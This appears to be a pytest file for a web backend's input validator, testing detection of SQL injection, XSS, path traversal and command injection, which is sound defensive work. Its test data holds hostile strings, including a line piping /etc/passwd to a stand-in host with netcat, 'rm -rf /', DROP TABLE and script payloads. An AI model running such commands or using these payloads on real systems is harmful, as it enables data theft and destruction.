"""Tests for InputValidator."""

import pytest
from fastapi import HTTPException

from backend.src.core.input_validator import InputValidator


class TestSQLInjection:
    def test_detects_union_select(self):
        assert InputValidator.check_sql_injection("' UNION SELECT * FROM users") is True

    def test_detects_drop_table(self):
        assert InputValidator.check_sql_injection("'; DROP TABLE users;") is True

    def test_detects_or_equals(self):
        assert InputValidator.check_sql_injection("' OR 1=1") is True

    def test_allows_normal_text(self):
        assert InputValidator.check_sql_injection("Hello world") is False

    def test_allows_normal_sentences(self):
        assert InputValidator.check_sql_injection("The selected item was updated") is False


class TestXSS:
    def test_detects_script_tag(self):
        assert InputValidator.check_xss("<script>alert('xss')</script>") is True

    def test_detects_javascript_protocol(self):
        assert InputValidator.check_xss("javascript:alert(1)") is True

    def test_detects_event_handler(self):
        assert InputValidator.check_xss('<img onerror="alert(1)">') is True

    def test_detects_iframe(self):
        assert InputValidator.check_xss("<iframe src='evil.com'>") is True

    def test_allows_normal_text(self):
        assert InputValidator.check_xss("Hello world") is False

    def test_allows_angle_brackets_without_tags(self):
        assert InputValidator.check_xss("x > 5 and y < 10") is False


class TestPathTraversal:
    def test_detects_dot_dot_slash(self):
        assert InputValidator.check_path_traversal("../../etc/passwd") is True

    def test_detects_encoded_traversal(self):
        assert InputValidator.check_path_traversal("%2e%2e/etc/passwd") is True

    def test_detects_double_encoded(self):
        assert InputValidator.check_path_traversal("%252e%252e/etc/passwd") is True

    def test_allows_normal_path(self):
        assert InputValidator.check_path_traversal("/api/v1/tasks") is False


class TestCommandInjection:
    def test_detects_semicolon(self):
        assert InputValidator.check_command_injection("ls; rm -rf /") is True

    def test_detects_pipe(self):
        assert InputValidator.check_command_injection("cat /etc/passwd | nc evil.com 80") is True

    def test_detects_dollar_paren(self):
        assert InputValidator.check_command_injection("$(whoami)") is True

    def test_detects_backtick(self):
        assert InputValidator.check_command_injection("`whoami`") is True

    def test_allows_normal_text(self):
        assert InputValidator.check_command_injection("Hello world") is False


class TestValidateUserInput:
    def test_raises_on_path_traversal(self):
        with pytest.raises(HTTPException) as exc_info:
            InputValidator.validate_user_input("../../etc/passwd", field_name="path")
        assert exc_info.value.status_code == 400

    def test_raises_on_xss(self):
        with pytest.raises(HTTPException) as exc_info:
            InputValidator.validate_user_input("<script>alert(1)</script>", field_name="name")
        assert exc_info.value.status_code == 400

    def test_allows_code_when_flagged(self):
        result = InputValidator.validate_user_input("<script>alert(1)</script>", field_name="prompt", allow_code=True)
        assert "<script>" in result

    def test_trims_whitespace(self):
        result = InputValidator.validate_user_input("  hello  ", field_name="name")
        assert result == "hello"

    def test_enforces_max_length(self):
        long_string = "a" * 20000
        result = InputValidator.validate_user_input(long_string, field_name="name")
        assert len(result) == 10000


class TestValidatePath:
    def test_raises_on_traversal(self):
        with pytest.raises(HTTPException):
            InputValidator.validate_path("../../../etc/passwd")

    def test_allows_normal_path(self):
        result = InputValidator.validate_path("/home/user/projects/myproject")
        assert result == "/home/user/projects/myproject"


class TestSanitizeHtml:
    def test_removes_tags(self):
        result = InputValidator.sanitize_html("<b>bold</b> text")
        assert result == "bold text"

    def test_removes_script_tags(self):
        result = InputValidator.sanitize_html("<script>alert(1)</script>safe")
        assert result == "alert(1)safe"


class TestValidateDictValues:
    def test_validates_nested_strings(self):
        with pytest.raises(HTTPException):
            InputValidator.validate_dict_values({"name": "<script>alert(1)</script>"})

    def test_allows_code_fields(self):
        InputValidator.validate_dict_values(
            {"prompt": "<script>test</script>"},
            allow_code_fields={"prompt"},
        )

    def test_validates_nested_dicts(self):
        with pytest.raises(HTTPException):
            InputValidator.validate_dict_values({"nested": {"name": "<script>xss</script>"}})

    def test_validates_list_items(self):
        with pytest.raises(HTTPException):
            InputValidator.validate_dict_values({"items": ["<script>xss</script>"]})

    def test_validates_dict_items_in_list(self):
        """Dict values inside a list are recursively validated."""
        with pytest.raises(HTTPException):
            InputValidator.validate_dict_values({"items": [{"name": "<script>xss</script>"}]})

    def test_allows_clean_dict_items_in_list(self):
        """Dict values inside a list pass when clean."""
        # Should not raise
        InputValidator.validate_dict_values({"items": [{"name": "clean value"}]})
